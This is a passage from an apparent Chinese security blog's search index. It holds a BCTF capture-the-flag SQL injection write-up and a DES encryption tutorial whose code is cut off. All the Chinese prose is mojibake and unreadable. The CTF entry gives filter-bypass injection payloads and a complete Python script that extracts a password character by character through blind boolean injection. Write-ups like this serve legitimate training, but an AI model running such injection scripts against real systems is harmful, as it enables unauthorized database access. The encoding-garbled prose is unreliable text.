href="http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/" title="http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/">http://blogs.360.cn/360webscan/2013/08/12/oracle10g-unwrap%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90-by-genxor/</a> è¿˜æ˜¯å¤šå­¦ä¹ å¤šè§è¯†å§...è¿‘æœŸå¤šæ‰“æ‰“å®é™…ç¯å¢ƒ,åç»­ç¢°åˆ°çš„ä¸œè¥¿ä¹Ÿä¼šæ…¢æ…¢å‘å‡ºæ¥.</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BCTFä¸€é“æ³¨å…¥é¢˜</title>
      <link href="/2018/04/22/bctf%E4%B8%80%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/"/>
      <url>/2018/04/22/bctf%E4%B8%80%E9%81%93%E6%B3%A8%E5%85%A5%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>emmmmm... æ¯”è¾ƒå°´å°¬...è¿™é“é¢˜æ˜¯æ¯”èµ›ä¹‹åè§£å‡ºæ¥çš„..å‡ºäº†ç‚¹å°æ„å¤–.... å¥½å§,è¿™é“é¢˜æ€è·¯è¯´ä¸€ä¸‹... ä¾æ—§æ˜¯Nu1lçš„é‚£ä½å‡º77777çš„å¸ˆå‚…å‡ºçš„é¢˜...è¿™ä¸ªæ˜¯ç¬¬ä¸‰å…³... å¼€å§‹æµ‹è¯•çš„æ—¶å€™å‘ç°è¿‡æ»¤çš„ä¸œè¥¿è¿˜æ˜¯å¾ˆå¤šçš„... å•å­—ç¬¦fuzzä¸€ä¸‹, å‘ç°å¯ä»¥ä½¿ç”¨çš„ ['"', '#', '$', "'", '(', ')', ',', '.', '2', '9', ';', '&gt;', '?', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '[', '\', ']', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '', '\x7f', '\x80'] ä¸èƒ½ä½¿ç”¨çš„ ['!', '%', '&amp;', '*', '+', '-', '/', '0', '1', '3', '4', '5', '6', '7', '8', ':', '&lt;', '=', '@', 'J', '^', '_', '`', 'j', '{', '}', '~'] ä¸€å¼€å§‹çš„æ—¶å€™åˆ©ç”¨æ€è·¯æ˜¯å‘ç°æŒ‰ä½æˆ–æ²¡è¿‡æ»¤,é‚£ä¹ˆå¯ä»¥å¯¹æ•°å­—è¿›è¡ŒæŒ‰ä½æˆ– æ¡ä»¶æˆç«‹å¼‚æˆ–2,æˆåŠŸ æ¡ä»¶ä¸æˆç«‹å¼‚æˆ–'a',å¤±è´¥ ç„¶ååˆå‘ç°if,æ‹¬å·,å¼•å·éƒ½æ²¡è¿‡æ»¤,é‚£ä¹ˆç®€å•æ„é€ payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(pw&gt;&#x27;&#123;flag&#125;&#x27;,2,&#x27;a&#x27;)</span><br></pre></td></tr></table></figure><p>å‘ç°æˆåŠŸæ³¨å…¥,è¿™é‡Œå…¶å®è¿™é“é¢˜å·²ç»åšå‡ºæ¥äº†.....åªæ˜¯æœ€åæå‡ºæ¥çš„æ˜¯å¤§å†™...æŒ‰å°å†™äº¤ä¸€ä¸‹å°±okäº†.. ä¸è¿‡è¿™ä¹Ÿæ˜¯æ¯”èµ›ä¹‹åå†™å‡ºé€šç”¨è„šæœ¬æ‰çŸ¥é“çš„äº†... å½“æ—¶ä»¥ä¸ºå§¿åŠ¿ä¸å¯¹,åˆæƒ³äº†è›®å¤šæ–¹æ³•,åæ¥ç¾å·¥å§å§è¯´ç”¨äº†&lt;,ç„¶è€Œæˆ‘&lt;æ˜¯åœ¨é»‘åå•é‡Œé¢,é‚£ä¹ˆå‡ºé¢˜äººåº”è¯¥ä¸æ˜¯å•å­—ç¬¦åŒ¹é…çš„ æ—¢ç„¶èƒ½ç”¨&lt;,é‚£ä¹ˆå¾ˆå¿«æˆ‘å°±æƒ³åˆ°,æœ‰æ•°å­—2,9,æŒ‰ä½æˆ–å’Œä½ç§»&lt;<å’Œ>&gt;å¯ä»¥æ„é€ å‡ºæ‰€æœ‰æ•°å­—,å†æ¬¡æµ‹è¯•,å‘ç°substræ²¡è¿‡æ»¤,ä½†æ˜¯ordå’Œascéƒ½è¿‡æ»¤äº†,ä¸è¿‡æ— æ‰€è°“,hexæ²¡æœ‰è¿‡æ»¤,æ„é€ å‡ºpayload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;if(hex(substr(pw,&#123;order&#125;,29&gt;&gt;2&gt;&gt;2))&gt;hex(&#123;asc&#125;),2,&#x27;a&#x27;)&quot;.format(order=makedigit(order),asc=makedigit(asc))</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç¾å·¥å§å§å†™äº†ä¸ªæ•°å­—æ›¿æ¢å‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">makedigit</span>(<span class="params">n</span>):</span><br><span class="line">    digits = [<span class="string">&quot;(2&gt;&gt;2)&quot;</span>, <span class="string">&quot;(992&gt;&gt;9)&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;(992&gt;&gt;92)&quot;</span>, <span class="string">&quot;(2*2)&quot;</span>, <span class="string">&quot;(22&gt;&gt;2)&quot;</span>, <span class="string">&quot;(2*22)&quot;</span>, <span class="string">&quot;9-2&quot;</span>, <span class="string">&quot;(2&lt;&lt;2)&quot;</span>, <span class="string">&quot;9&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> digits[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">&quot;(2&quot;</span></span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n0 = n</span><br><span class="line">        <span class="keyword">while</span> n0 &gt; <span class="number">2</span>:</span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line">            s += <span class="string">&quot;&lt;&lt;(992&gt;&gt;9)&quot;</span></span><br><span class="line">            n0 = n0 / <span class="number">2</span></span><br><span class="line">        s += <span class="string">&quot;)&quot;</span></span><br><span class="line">        p = <span class="number">2</span>**m - n</span><br><span class="line">        <span class="keyword">while</span> p &gt; <span class="number">9</span>:</span><br><span class="line">            p = p - <span class="number">9</span></span><br><span class="line">            s += <span class="string">&quot;-9&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, p):</span><br><span class="line">            s += <span class="string">&quot;-(992&gt;&gt;9)&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è´´å‡ºå®Œæ•´ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">makedigit</span>(<span class="params">n</span>):</span><br><span class="line">    digits = [<span class="string">&quot;(2&gt;&gt;2)&quot;</span>, <span class="string">&quot;(992&gt;&gt;9)&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;(992&gt;&gt;92)&quot;</span>, <span class="string">&quot;(2*2)&quot;</span>, <span class="string">&quot;(22&gt;&gt;2)&quot;</span>, <span class="string">&quot;(2*22)&quot;</span>, <span class="string">&quot;9-2&quot;</span>, <span class="string">&quot;(2&lt;&lt;2)&quot;</span>, <span class="string">&quot;9&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> digits[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s = <span class="string">&quot;(2&quot;</span></span><br><span class="line">        m = <span class="number">1</span></span><br><span class="line">        n0 = n</span><br><span class="line">        <span class="keyword">while</span> n0 &gt; <span class="number">2</span>:</span><br><span class="line">            m += <span class="number">1</span></span><br><span class="line">            s += <span class="string">&quot;&lt;&lt;(992&gt;&gt;9)&quot;</span></span><br><span class="line">            n0 = n0 / <span class="number">2</span></span><br><span class="line">        s += <span class="string">&quot;)&quot;</span></span><br><span class="line">        p = <span class="number">2</span>**m - n</span><br><span class="line">        <span class="keyword">while</span> p &gt; <span class="number">9</span>:</span><br><span class="line">            p = p - <span class="number">9</span></span><br><span class="line">            s += <span class="string">&quot;-9&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, p):</span><br><span class="line">            s += <span class="string">&quot;-(992&gt;&gt;9)&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + s + <span class="string">&quot;)&quot;</span></span><br><span class="line"></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> order <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    ok = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> asc <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">129</span>):</span><br><span class="line">        data=&#123;<span class="string">&#x27;flag&#x27;</span>:<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;hi&#x27;</span>:<span class="string">&quot;if(hex(substr(pw,&#123;order&#125;,29&gt;&gt;2&gt;&gt;2))&gt;hex(&#123;asc&#125;),2,&#x27;a&#x27;)&quot;</span>.<span class="built_in">format</span>(order=makedigit(order),asc=makedigit(asc))&#125;</span><br><span class="line">        r=requests.post(<span class="string">&#x27;http://3cc7fb1de9db416aabfdfba5dfef3490f3a610e11c3d44fd.game.ichunqiu.com/&#x27;</span>, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;sorry&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            ok=<span class="number">0</span></span><br><span class="line">            res+=<span class="built_in">chr</span>(asc)</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> asc == <span class="number">128</span>:</span><br><span class="line">            ok = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> ok:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>æœ€åæ‹¿åˆ°ç»“æœ hhhhccchhddddahhhhhh æ„Ÿè§‰flagæ²¡æœ‰è®¾è®¡å¥½,å¹¶æ²¡æœ‰ä»€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦... è¦æ˜¯ä¸€å¼€å§‹æ¥ä¸ªè¢«è¿‡æ»¤çš„'j',é‚£å¤šèˆ’æœå•Š... ä¸è¿‡æ€è·¯è¿˜æ˜¯å¾ˆå¥½ç©çš„,è®°å½•ä¸€ä¸‹</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>desåŠ å¯†è¯¦è§£</title>
      <link href="/2018/04/08/des%E5%8A%A0%E5%AF%86%E8%AF%A6%E8%A7%A3/"/>
      <url>/2018/04/08/des%E5%8A%A0%E5%AF%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h2 id="deså­¦ä¹ ">deså­¦ä¹ </h2><h3 id="feistel-cipher">Feistel cipher</h3><p>é¦–å…ˆæˆ‘ä»¬å¾—äº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯feistelåŠ å¯† feistelåŠ å¯†æ˜¯ä¸€ç§åŒºå—åŠ å¯† ä¸€å¼ å›¾è§£é‡Šå®Œæ¯•~ <img src="/images/2018/06/feistel.jpg" alt="blacsheep" /> éœ€è¦æ³¨æ„çš„æ˜¯,feistelæ˜¯ä¸€ç§åŠ å¯†çš„æ¡†æ¶,å› ä¸ºå…¶ä¸­çš„få¯ä»¥ç”±ç”¨æˆ·è‡ªè¡Œå®šä¹‰,è€Œä¸”få¯¹äºè§£å¯†ä¸äº§ç”Ÿä»»ä½•å½±å“ã€‚æé†’ä¸€ç‚¹:è§£å¯†çš„æ—¶å€™é¦–å…ˆè¦æŠŠLå’ŒRåä¸€ä¸‹,ä¸€å¼€å§‹å†™desçš„æ—¶å€™è§£å¯†å°±æ˜¯å› ä¸ºæœ€åæ²¡æœ‰æ³¨æ„åˆ°è¿™é‡Œå¯¼è‡´æ— æ³•è§£å¯†,æœ€åæ‰‹æ’¸desçš„æ—¶å€™å‘ç°è¿™ä¸€ç‚¹æ‰è§£å†³...</p><h3 id="desåŠ å¯†">desåŠ å¯†</h3><p>ç®€å•çš„äº†è§£äº†feistelä¹‹åæˆ‘ä»¬å°±å¼€å§‹äº†è§£ä¸€ä¸‹deså’¯ Data Encryption Standardç¼©å†™des ä¸ªäººç†è§£,desåŠ å¯†ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†:</p><h4 id="ä¸€ä¸ªéƒ¨åˆ†æ˜¯ipå’Œip-1ç½®æ¢">ä¸€ä¸ªéƒ¨åˆ†æ˜¯IPå’ŒIP-1ç½®æ¢</h4><p><img src="/images/2018/06/des-IP-IP-1.jpg" alt="blacsheep" /> ä¹Ÿå°±æ˜¯åŸæ¥çš„ç¬¬58ä½æ”¾åˆ°ç¬¬ä¸€ä½,ç¬¬50ä½æ”¾åˆ°ç¬¬äºŒä½balabala..</p><h4 id="ä¸€ä¸ªéƒ¨åˆ†æ˜¯å¯†é’¥çš„å¤„ç†">ä¸€ä¸ªéƒ¨åˆ†æ˜¯å¯†é’¥çš„å¤„ç†</h4><p><img src="/images/2018/06/des-key-gen.jpg" alt="blacsheep" /> 16è½®è¿­ä»£ä¹‹åæ°å¥½ä¸º28,å›åˆ°åŸç‚¹ç»§ç»­ä»£ä¸‹ä¸€ä¸ªå—</p><h4 id="ä¸€ä¸ªæ˜¯feistelä¸­fçš„å®ç°">ä¸€ä¸ªæ˜¯feistelä¸­fçš„å®ç°</h4><p>é¦–å…ˆæ€»ä½“çš„æ¡†æ¶ <img src="/images/2018/06/des-F-func.jpg" alt="blacsheep" /> å…·ä½“çœ‹ä¸‹æ¯ä¸ªéƒ¨åˆ†</p><h5 id="eç›’">Eç›’</h5><p>32bits-&gt;48bits <img src="/images/2018/06/des-E-Box.jpg" alt="blacsheep" /></p><h5 id="sç›’">Sç›’</h5><p><img src="/images/2018/06/des-S-Box.jpg" alt="blacsheep" /> å…·ä½“çš„ä½¿ç”¨,ä¸¾ä¸ªæ —å­,å‡è®¾ç¬¬ä¸€ä¸ª6bitsä¸º110101,å–é¦–ä½ä¸¤ä¸ªbits,å³ä¸º11,ä¸º3å¯¹åº”ç¬¬ä¸‰è¡Œ ä¸­é—´1010ä¸º10å¯¹åº”ç¬¬ååˆ—,ç¬¬ä¸€ä¸ª6bitså¯¹åº”S1é‚£ä¹ˆå°±æ¢æˆ12,å³1100 ä¹Ÿå°±é€šè¿‡Sç›’å®Œæˆäº†110101-&gt;1100çš„6bitsåˆ°4bitsçš„è½¬æ¢ åˆ—å‡º8ä¸ªSç›’: Sç›’1: 14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7 0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8 4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0 15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13 Sç›’2: 15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10 3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5 0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15 13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9 Sç›’3: 10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8 13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1 13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7 1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12 Sç›’4: 7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5 ,11, 12, 4, 15 13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9 10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4 3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14 Sç›’5: 2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9 14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6 4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14 11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3 Sç›’6: 12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11 10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8 9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6 4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13 Sç›’7: 4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1 13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6 1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2 6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12 Sç›’8: 13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7 1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2 7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8 2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11</p><h5 id="pç›’">Pç›’</h5><p>Sç›’è¾“å‡ºçš„32ä½ç»§ç»­æŒ‰ç…§Pç›’è¿›è¡Œç½®æ¢ã€‚ 16, 7, 20, 21, 29, 12, 28, 17, 1, 15, 23, 26, 5, 18, 31, 10 2, 8, 24, 14, 32, 27, 3, 9, 19, 13, 30, 6, 22, 11, 4, 25 æ¯”å¦‚åŸæ¥çš„ç¬¬21ä¸ºæ”¾åˆ°ç¬¬4ä½,æ›¿æ¢å®Œæˆå°±å®Œæˆäº†fçš„æœ€åæ“ä½œ</p><h3 id="ç»™ä¸ªä»£ç ">ç»™ä¸ªä»£ç </h3><p>åªå†™äº†bitsçš„éƒ¨åˆ†å’Œbin2asc,asc2binçš„å‡½æ•°,å› ä¸ºdesçš„paddingä¸æ¸…æ¥š...ç­‰ç ”ç©¶ç ”ç©¶å†æ”¹...</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">src,num</span>):</span><br><span class="line">        src = <span class="built_in">str</span>(src)</span><br><span class="line">        src = <span class="string">&#x27;0&#x27;</span>*(num-<span class="built_in">len</span>(src))+src</span><br><span class="line">        <span class="keyword">return</span> src</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">str1,str2</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(str1[i])==<span class="built_in">int</span>(str2[i]):</span><br><span class="line">            res.append(<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res.append(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_from_zero</span>(<span class="params">list1</span>):</span><br><span class="line">    new = []</span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> list1:</span><br><span class="line">        new.append(each-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> new</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2asc</span>(<span class="params">list_of_bin</span>):</span><br><span class="line">    group = [list_of_bin[<span class="number">8</span>*i:<span class="number">8</span>*i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(<span class="built_in">len</span>(list_of_bin)/<span class="number">8</span>))]</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> one <span class="keyword">in</span> group:</span><br><span class="line">        temp = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> each <span class="keyword">in</span> one:</span><br><span class="line">            temp*=<span class="number">2</span></span><br><span class="line">            temp+=<span class="built_in">int</span>(each)</span><br><span class="line">        res+=<span class="built_in">chr</span>(temp)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">asc2bin</span>(<span class="params">str1</span>):</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> str1:</span><br><span class="line">        res+=padding(<span class="built_in">bin</span>(<span class="built_in">ord</span>(each))[<span class="number">2</span>:],<span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DES</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key</span>):</span><br><span class="line">        self.key=<span class="string">&#x27;&#x27;</span></span><br><span class="line">        key=key[<span class="number">0</span>:<span class="number">8</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*]keyåªå–äº†8ä¸ªå­—æ¯æ‰©å±•æˆbits,é•¿äº8ä¸ªå­—æ¯çš„keyå–äº†å‰å…«ä¸ªå­—æ¯!&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">            self.key+=padding(<span class="built_in">bin</span>(<span 